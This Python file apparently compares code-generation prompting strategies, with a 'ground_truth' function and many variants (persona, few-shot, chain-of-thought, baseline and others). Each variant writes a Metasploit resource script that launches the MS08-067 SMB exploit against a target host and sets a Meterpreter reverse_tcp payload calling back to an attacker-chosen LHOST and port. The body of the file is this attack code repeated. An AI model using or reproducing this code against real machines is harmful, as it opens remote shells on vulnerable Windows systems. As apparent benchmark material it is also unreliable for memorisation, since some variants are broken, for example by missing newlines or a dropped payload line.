def ground_truth_code_confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

def persona_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

def template_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            lines = [
                'use exploit/windows/smb/ms08_067_netapi',
                'set RHOST ' + str(tgtHost) + '\n',
                'set payload windows/meterpreter/reverse_tcp\n',
                'set LPORT ' + str(lport) + '\n',
                'set LHOST ' + lhost + '\n',
                'exploit -j -z'
            ]
            for line in lines:
                file.write(line + '\n')
    except Exception as e:
        print(f'Error occurred: {e}')

def question_refinement_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi')
            file.write(f'set RHOST {tgtHost}')
            file.write(f'set LHOST {lhost}')
            file.write(f'set LPORT {lport}')
    except IOError as e:
        print(f'An error occurred: {e}')

def alternative_approaches_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

def context_manager_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write(f'set RHOST {tgtHost}\n')
        file.write(f'set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z')

def iterative_prompting_3_confickerExploit(config_file, tgt_host, lhost, lport):
    if not isinstance(config_file, str):
        raise ValueError('config_file must be a string representing the file path')
    if not isinstance(tgt_host, str):
        raise ValueError('tgt_host must be a string representing the target host')
    if not isinstance(lhost, str):
        raise ValueError('lhost must be a string representing the local host')
    if not isinstance(lport, int) or lport <= 0:
        raise ValueError('lport must be a positive integer representing the local port')
    import os
    safe_path = os.path.abspath(config_file)
    if not safe_path.startswith(os.getcwd()):
        raise ValueError('config_file must be inside the current working directory')
    safe_file_name = os.path.basename(safe_path)
    if '..' in safe_file_name or ';' in safe_file_name:
        raise ValueError('config_file path contains unsafe characters')
    try:
        with open(safe_path, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgt_host) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z')
    except IOError as e:
        logging.error(f'An I/O error occurred: {e.strerror}')
        raise

def iterative_prompting_4_confickerExploit(configFile, tgtHost, lhost, lport):
    if not all([configFile, tgtHost, lhost, lport]) or not isinstance(tgtHost, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise ValueError("Invalid input parameters")
    try:
        from pathlib import Path
        file_path = Path(configFile)
        if not file_path.parent.is_dir():
            raise ValueError(f"The directory {file_path.parent} does not exist")
        if file_path.exists() and not file_path.is_file():
            raise ValueError(f"The path {file_path} is not a file")
        with file_path.open('w') as file:
            content = f'use exploit/windows/smb/ms08_067_netapi\n' \
                      f'set RHOST {tgtHost}\n' \
                      f'set payload windows/meterpreter/reverse_tcp\n' \
                      f'set LPORT {lport}\n' \
                      f'set LHOST {lhost}\n' \
                      f'exploit -j -z\n'
            file.write(content)
    except ValueError as ve:
        raise
    except IOError as ioe:
        raise
    except Exception as e:
        raise

def iterative_prompting_5_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

def few_shots_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z')

def cot_prompting_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

def fact_check_list_confickerExploit(configFile, tgtHost, lhost, lport):
    assert isinstance(configFile, str), "configFile must be a string"
    assert isinstance(tgtHost, str), "tgtHost must be a string"
    assert isinstance(lhost, str), "lhost must be a string"
    assert isinstance(lport, int), "lport must be an integer"

    config_lines = [
        'use exploit/windows/smb/ms08_067_netapi\n',
        f'set RHOST {tgtHost}\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n'
    ]

    try:
        with open(configFile, 'a') as file:
            for line in config_lines:
                file.write(line)
    except IOError as e:
        print(f"An error occurred: {e}")


def not_interactive_mix_confickerExploit(configFile, tgtHost, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/windows/smb/ms08_067_netapi\n')
            file.write('set RHOST ' + str(tgtHost) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
    except Exception as e:
        print(f"Error writing to config file: {e}")

def baseline_confickerExploit(configFile, tgtHost, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/windows/smb/ms08_067_netapi\n')
        file.write('set RHOST ' + str(tgtHost) + '\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')

